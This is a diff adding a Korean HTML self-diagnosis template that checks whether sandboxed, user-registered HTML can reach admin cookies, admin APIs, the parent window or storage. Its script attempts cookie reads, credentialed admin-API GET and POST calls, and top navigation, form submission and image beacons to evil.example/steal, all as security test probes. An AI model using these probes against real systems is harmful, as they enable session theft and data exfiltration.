@@ -1,0 +1,152 @@
+<!doctype html>
+<!--
+  격리 자가 진단 템플릿 (ADR 0003 · ADR 0018)
+  이 파일을 템플릿으로 등록한 뒤 미리보기 또는 배포 링크로 열면,
+  등록 HTML이 관리자 인증 정보·관리자 API에 접근할 수 있는지 스스로 시도하고 결과를 표로 보여 준다.
+  모든 행이 "차단됨"이면 과제 조건 "등록한 HTML이 관리자 인증 정보나 관리자 API에 접근하지 못하게 해야 합니다"가 충족된 것이다.
+  마지막 행(이미지 비콘)은 의도적으로 "허용됨"이 나온다 — 방문자 입력의 외부 유출은 격리 대상이 아니며 ADR 0003에 잔여 위험으로 기록돼 있다.
+  이 템플릿은 실제 캠페인에 쓰지 않는다. 진단이 끝나면 삭제해도 된다.
+-->
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>격리 자가 진단</title>
+<style>
+  * { box-sizing: border-box; }
+  body { margin: 0; padding: 24px; font-family: -apple-system, "Apple SD Gothic Neo", "Noto Sans KR", sans-serif; background: #0b1220; color: #e5e7eb; }
+  .wrap { max-width: 760px; margin: 0 auto; }
+  h1 { font-size: 20px; margin: 0 0 4px; }
+  p.lead { color: #9ca3af; font-size: 13px; margin: 0 0 16px; line-height: 1.5; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; background: #111827; border-radius: 10px; overflow: hidden; }
+  th, td { padding: 9px 10px; border-bottom: 1px solid #1f2937; text-align: left; vertical-align: top; }
+  th { background: #1f2937; color: #9ca3af; font-weight: 600; }
+  td.detail { color: #9ca3af; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; word-break: break-all; }
+  .ok { color: #86efac; font-weight: 700; }
+  .bad { color: #fca5a5; font-weight: 700; }
+  .warn { color: #fde68a; font-weight: 700; }
+  .pending { color: #9ca3af; }
+  .summary { margin: 16px 0; padding: 12px 14px; border-radius: 10px; background: #1f2937; font-weight: 600; }
+  form { margin-top: 20px; padding: 14px; border: 1px dashed #374151; border-radius: 10px; }
+  form label { display: block; font-size: 12px; color: #9ca3af; margin-bottom: 4px; }
+  form input { width: 100%; padding: 8px 10px; border-radius: 8px; border: 1px solid #374151; background: #0b1220; color: #e5e7eb; margin-bottom: 10px; }
+  form button { padding: 9px 14px; border: 0; border-radius: 8px; background: #60a5fa; color: #0b1220; font-weight: 700; }
+  [data-lead-success] { background: #052e16; color: #bbf7d0; padding: 12px; border-radius: 8px; }
+  [data-lead-error] { background: #450a0a; color: #fecaca; padding: 10px; border-radius: 8px; }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>격리 자가 진단</h1>
+  <p class="lead">이 페이지 안의 스크립트가 관리자 쿠키·관리자 API·부모 창·최상위 이동·저장소 접근을 직접 시도한 결과입니다. 관리자로 로그인된 브라우저에서 열어도 모든 행이 "차단됨"이어야 합니다.</p>
+
+  <div class="summary" id="summary">진단 중…</div>
+
+  <table>
+    <thead><tr><th style="width:36%">시도</th><th style="width:14%">결과</th><th>상세</th></tr></thead>
+    <tbody id="rows"></tbody>
+  </table>
+
+  <form>
+    <label for="name">이름 (실제 제출 계약 확인용)</label>
+    <input id="name" name="name" placeholder="테스트">
+    <label for="email">이메일</label>
+    <input id="email" name="email" type="email" placeholder="you@example.com">
+    <input type="hidden" name="consent" value="yes">
+    <button type="submit">제출해 보기 (정상 경로: 시스템이 가로채 JSON으로 저장)</button>
+  </form>
+</div>
+
+<script>
+(function () {
+  var rows = document.getElementById('rows');
+  var summary = document.getElementById('summary');
+  var results = [];
+
+  function add(name, status, detail) {
+    results.push({ name: name, status: status });
+    var tr = document.createElement('tr');
+    var cls = status === '차단됨' ? 'ok' : status === '허용됨(잔여 위험)' ? 'warn' : status === '진단 중' ? 'pending' : 'bad';
+    tr.innerHTML = '<td>' + name + '</td><td class="' + cls + '">' + status + '</td><td class="detail"></td>';
+    tr.lastChild.textContent = detail;
+    rows.appendChild(tr);
+    return tr;
+  }
+  function update(tr, status, detail) {
+    results.forEach(function (r) { if (r.name === tr.firstChild.textContent) r.status = status; });
+    var cls = status === '차단됨' ? 'ok' : status === '허용됨(잔여 위험)' ? 'warn' : 'bad';
+    tr.children[1].className = cls; tr.children[1].textContent = status; tr.children[2].textContent = detail;
+    finish();
+  }
+  function finish() {
+    var pending = results.filter(function (r) { return r.status === '진단 중'; }).length;
+    if (pending) { summary.textContent = '진단 중… (' + pending + '건 남음)'; return; }
+    var bad = results.filter(function (r) { return r.status === '허용됨' ; }).length;
+    summary.textContent = bad === 0
+      ? '결과: 관리자 인증 정보·관리자 API 접근 시도 전부 차단됨 (조건 충족). 마지막 행의 "허용됨(잔여 위험)"은 설계상 예상된 결과입니다.'
+      : '결과: 차단되지 않은 시도가 ' + bad + '건 있습니다. 격리 설정을 확인하세요.';
+    summary.style.background = bad === 0 ? '#052e16' : '#450a0a';
+  }
+
+  // 1. 쿠키 읽기
+  try {
+    var c = document.cookie;
+    add('document.cookie 읽기 (관리자 세션 sid)', c === '' ? '차단됨' : '허용됨', c === '' ? '빈 문자열 (opaque 오리진, 쿠키 없음)' : '값이 읽힘: ' + c.slice(0, 60));
+  } catch (e) { add('document.cookie 읽기 (관리자 세션 sid)', '차단됨', e.name + ' (sandbox가 접근 자체를 막음)'); }
+
+  // 2. 관리자 API 호출 (상대 경로, 3001, 3000) — 인증된 응답(200)이면 허용됨
+  var targets = [
+    ['/api/admin/campaigns', '관리자 API GET (상대 경로)'],
+    ['http://localhost:3001/api/admin/campaigns', '관리자 API GET (API 오리진 3001)'],
+    ['http://localhost:3000/api/admin/auth/me', '관리자 API GET (관리자 화면 오리진 3000)']
+  ];
+  targets.forEach(function (t) {
+    var tr = add(t[1], '진단 중', '');
+    fetch(t[0], { credentials: 'include' }).then(function (r) {
+      update(tr, r.status === 200 ? '허용됨' : '차단됨', 'HTTP ' + r.status + (r.status === 401 ? ' (쿠키 미전송 → 미인증)' : ''));
+    }).catch(function (e) {
+      update(tr, '차단됨', e.name + ': ' + e.message + ' (CSP connect-src 또는 CORS로 요청 자체가 실패)');
+    });
+  });
+
+  // 3. 관리자 API 상태 변경 시도 (POST) — 서버에 흔적이 남으면 허용됨
+  var trPost = add('관리자 API POST (캠페인 생성 시도, 이름 ISOLATION-CHECK)', '진단 중', '');
+  fetch('/api/admin/campaigns', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name: 'ISOLATION-CHECK' }) })
+    .then(function (r) { update(trPost, r.status === 201 ? '허용됨' : '차단됨', 'HTTP ' + r.status); })
+    .catch(function (e) { update(trPost, '차단됨', e.name + ' (요청이 나가지 않음). 관리자 대시보드에 ISOLATION-CHECK 캠페인이 없어야 합니다'); });
+
+  // 4. 부모 창 접근
+  try { var t = parent.document.title; add('부모 창 DOM 접근 (parent.document)', '허용됨', '제목 읽힘: ' + t); }
+  catch (e) { add('부모 창 DOM 접근 (parent.document)', '차단됨', e.name + ' (opaque 오리진)'); }
+
+  // 5. 로컬 스토리지
+  try { localStorage.setItem('x', '1'); add('localStorage 쓰기', '허용됨', '저장됨'); }
+  catch (e) { add('localStorage 쓰기', '차단됨', e.name); }
+
+  // 6. 최상위 창 이동 시도 — 이동되지 않으면 차단
+  var trNav = add('최상위 창 이동 (top.location = evil)', '진단 중', '');
+  try { top.location.href = 'https://evil.example/'; }
+  catch (e) { update(trNav, '차단됨', e.name + ' (sandbox: allow-top-navigation 없음)'); }
+  setTimeout(function () { if (trNav.children[1].textContent === '진단 중') update(trNav, '차단됨', '1초 후에도 이 페이지가 그대로임'); }, 1000);
+
+  // 7. 네이티브 폼 전송 (action=evil) — CSP form-action 'none'
+  var trForm = add('네이티브 폼 전송 (action=https://evil.example)', '진단 중', '');
+  try {
+    var f = document.createElement('form'); f.action = 'https://evil.example/steal'; f.method = 'post'; f.target = '_self';
+    var i = document.createElement('input'); i.name = 'x'; i.value = '1'; f.appendChild(i); document.body.appendChild(f);
+    f.submit();
+    setTimeout(function () { update(trForm, '차단됨', '전송 후에도 이 페이지가 그대로임 (CSP form-action none)'); }, 1200);
+  } catch (e) { update(trForm, '차단됨', e.name); }
+
+  // 8. 이미지 비콘 (잔여 위험 — 방문자 입력 유출은 격리 대상이 아님)
+  var trImg = add('이미지 비콘 (img src=evil.example) — 잔여 위험', '진단 중', '');
+  var img = new Image();
+  img.onload = function () { update(trImg, '허용됨(잔여 위험)', '요청이 나감 (ADR 0003: img-src * 허용, 운영자는 신뢰 주체)'); };
+  img.onerror = function () { update(trImg, '허용됨(잔여 위험)', '요청이 시도됨 (도메인이 없어 실패했지만 CSP는 막지 않음)'); };
+  img.src = 'https://evil.example/beacon?t=' + Date.now();
+
+  finish();
+})();
+</script>
+</body>
+</html>
